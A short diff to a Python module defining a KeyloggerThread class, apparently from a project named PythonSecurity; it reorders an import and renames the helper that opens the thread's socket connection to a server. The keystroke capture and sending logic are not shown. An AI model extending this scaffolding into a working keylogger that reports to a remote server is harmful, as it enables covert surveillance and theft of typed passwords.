@@ -1,12 +1,12 @@
 import threading
 import time
-from PythonSecurity.utils import *
 from config import KEYLOGGER_OPTION
+from PythonSecurity.utils import *
 
 class KeyloggerThread(threading.Thread):
     def __init__(self):
         super().__init__()
-        self.client_socket = make_and_connect_unblocked_socket_to_server()
+        self.client_socket = connect_unblocked_socket()
         self.disconnect_socket = threading.Event()
 
     def run(self):
